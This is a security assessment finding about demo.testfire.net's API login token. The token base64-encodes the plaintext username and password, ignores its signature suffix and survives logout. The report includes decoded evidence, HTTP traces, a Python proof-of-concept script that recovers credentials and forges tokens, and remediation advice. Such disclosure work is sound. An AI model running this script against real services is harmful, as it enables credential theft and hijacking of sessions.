# API Bearer Token Embeds Reversible Credentials, Ignores Its Signature, and Survives Logout

**ID:** vuln-0013
**Severity:** LOW
**Found:** 2026-09-20 21:48:33 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /api/login
**Method:** POST
**CWE:** CWE-522
**CVSS:** 3.7
**Confidence:** High
**Fix Effort:** Medium

## Description

The bearer token issued by `POST /api/login` is not an opaque session token. It is `base64(base64(username) + ":" + base64(password) + ":" + <eight random bytes>)`, so the account's plaintext password can be recovered by anyone who observes the token. The trailing eight bytes are not validated (a token with an empty or arbitrary trailing value is accepted), and `GET /api/logout` reports success without invalidating previously issued tokens, which therefore remain valid indefinitely.

## Evidence

Token decodes to plaintext credentials:

```text
token  : YW5OdGFYUm86WkdWdGJ6RXlNelE9Oj8/bDA/
decode : anNtaXRo:ZGVtbzEyMzQ=:??l0?
fields : jsmith : demo1234 : <random 8 bytes>
```

Recovered password succeeds on the web login:

```http
POST /doLogin HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uid=jsmith&passw=demo1234&btnSubmit=Login
-> HTTP/1.1 302 Found
   Location: /bank/main.jsp
```

Tokens with a missing or arbitrary signature field are accepted (`GET /api/account`):

```text
forge("jsmith","demo1234", b"")        -> 200 OK (account list returned)
forge("jsmith","demo1234", b"12345678")-> 200 OK (account list returned)
forge("jsmith","WRONGPASS")            -> 401 loggedIn=false  (password still checked)
```

Logout does not revoke:

```http
GET /api/logout  (Authorization: Bearer <tok>)  -> 200 {"LoggedOut":"True"}
GET /api/account (Authorization: Bearer <tok>)  -> 200 (account list still returned)
```

## Impact

Any exposure of a token — through logs, browser history, an XSS payload, a referrer header, or an intermediary — discloses the user's plaintext password (not merely a session), enabling credential reuse against the web login. Because tokens are not revoked on logout and carry no expiry, a captured token (and the password it contains) remains usable after the user logs out, removing the ability to terminate a compromised session.

## Counterevidence

Actively tested whether the weak structure enables a true authentication bypass: a forged token whose password field is wrong is rejected (`401`), so the server does re-validate the decoded credentials and a pure "forge without credentials" bypass is not available (that route is the separate SQL-injection finding). The trailing 8 bytes being unvalidated therefore does not, by itself, grant access without valid credentials. What remains is that the token is a reversible credential with no expiry and no revocation. Severity is kept at Low because exploitation requires the attacker to already hold a token; there is no demonstrated acquisition path in this report.

## What Would Change This Severity

Demonstrating a concrete token-acquisition vector (for example a reflected/stored XSS that reads the token, or token leakage via referrer/logs that an unauthenticated attacker can trigger) would raise this to Medium/High by removing the "attacker already holds the token" precondition.

## Technical Analysis

A successful `POST /api/login` returns a token whose structure is b64 of three colon-separated fields: base64(username), base64(password) and a short random suffix. Decoding the token from a normal `jsmith` login yields the literal credentials and an ignored suffix:

```
token  : YW5OdGFYUm86WkdWdGJ6RXlNelE9Oj8/bDA/
decode : anNtaXRo:ZGVtbzEyMzQ=:??l0?     ->  jsmith : demo1234 : <random>
```

Three independent weaknesses follow from this design:

1. **Reversible credentials.** `base64decode(token)` exposes `base64(username)` and `base64(password)`; base64 is not encryption, so the password is recovered directly. The recovered password was verified to work against the web login (`POST /doLogin`).

2. **No signature / integrity check.** Tokens minted with an empty or arbitrary suffix are accepted, so the trailing value provides no integrity guarantee:

```python
forge("jsmith", "demo1234", b"")            # empty suffix        -> 200
forge("jsmith", "demo1234", b"12345678")    # arbitrary suffix    -> 200
```

The password field itself *is* validated server-side (a token whose password field is wrong returns `401`), so the practical effect is that the token is a portable, reversible credential rather than a verifiable session artifact.

3. **No revocation.** After calling `GET /api/logout` (which returns `{"LoggedOut":"True"}`), the same token is still accepted by `GET /api/account` (`200`). Logging out of the web application (`/logout.jsp`) likewise does not invalidate an API token. The token contains no timestamp and there is no server-side token store, so there is no expiry and no way to revoke access.

## Proof of Concept

1. Authenticate with valid credentials at `POST /api/login` and capture the returned `Authorization` token.
2. Base64-decode the token to obtain `<base64(username)>:<base64(password)>:<random>`; base64-decode the first two fields to recover the plaintext username and password.
3. Reuse the recovered username/password on the web login `POST /doLogin`; the login succeeds, proving the token discloses reusable credentials.
4. Build a token with an empty trailing field for the same user and send it to `GET /api/account`; the request is accepted (`200`), showing the suffix is not validated.
5. Call `GET /api/logout` with a token, then replay the same token against `GET /api/account`; it still returns the account list (`200`), showing logout does not revoke the token.

```python
import base64, requests

BASE = "http://demo.testfire.net"

def b64e(s): return base64.b64encode(s.encode()).decode()
def b64d(s):
    s = s.replace("\\/", "/")
    return base64.b64decode(s + "=" * ((4 - len(s) % 4) % 4))

def forge(user, password, suffix=b""):
    inner = b64e(user) + ":" + b64e(password) + ":" + suffix.decode("latin1")
    return base64.b64encode(inner.encode("latin1")).decode()

# 1. Obtain a token and recover the plaintext credentials.
tok = requests.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"},
                    timeout=15).json()["Authorization"]
inner = b64d(tok).decode("latin1")
u_b64, p_b64, suffix = inner.split(":")
user, pw = b64d(u_b64).decode(), b64d(p_b64).decode()
print("recovered credentials:", user, pw)

# 2. Recovered password works on the web login.
r = requests.post(BASE + "/doLogin",
                  data={"uid": user, "passw": pw, "btnSubmit": "Login"},
                  allow_redirects=False, timeout=15)
print("web login with recovered creds:", r.status_code, r.headers.get("Location"))

# 3. Token with an empty signature field is accepted.
r2 = requests.get(BASE + "/api/account",
                  headers={"Authorization": "Bearer " + forge("jsmith", "demo1234")},
                  timeout=15)
print("forged (empty suffix):", r2.status_code)

# 4. Logout does not invalidate the token.
requests.get(BASE + "/api/logout",
             headers={"Authorization": "Bearer " + tok}, timeout=15)
r3 = requests.get(BASE + "/api/account",
                  headers={"Authorization": "Bearer " + tok}, timeout=15)
print("token valid after logout:", r3.status_code)
```

## Remediation

Stop encoding credentials into the token. Issue an opaque, high-entropy random session identifier (or a properly signed JWT using a server-held key) that contains no username or password material. Store session state server-side with an explicit expiry and a revocation list, and invalidate the session record in the logout handler so that logout truly terminates the session. If a self-contained signed token is used, verify the signature and expiry on every request and reject tokens whose signature does not validate; never accept a token with a missing or malformed signature.

## Assumptions

Assumes an attacker can observe a token by some means (log capture, an XSS payload reading client-side storage, an intermediary, or a referrer leak). No direct token-theft vector is demonstrated in this report; the finding is the weakness of the token itself once exposed.
